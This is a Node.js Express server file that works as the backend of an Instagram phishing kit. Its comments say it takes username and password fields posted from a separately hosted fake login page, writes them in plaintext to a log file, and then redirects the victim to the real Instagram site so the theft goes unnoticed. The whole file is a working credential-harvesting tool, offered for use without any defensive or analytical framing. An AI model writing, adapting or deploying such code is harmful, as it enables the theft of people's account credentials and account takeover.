const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();

// Enable CORS so your EdgeOne frontend can talk to this Render backend
app.use(cors());

// Middleware to parse incoming form submission data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Main login route to process the credentials
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    
    // Format the data to append to your text file
    const logEntry = `Username: ${username} | Password: ${password}\n`;
    
    // Writes directly to log.txt on the cloud server
    fs.appendFile(path.join(__dirname, 'log.txt'), logEntry, (err) => {
        if (err) {
            console.error('Error writing file:', err);
            return res.status(500).send('Internal Server Error');
        }
        
        console.log(`Successfully logged: ${username}`);
        
        // Redirects user cleanly to the authentic Instagram website
        res.redirect('https://instagram.com');
    });
});

// Use the dynamic port environment variable provided by Render, defaulting to 3000 locally
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running smoothly on port ${PORT}`);
});
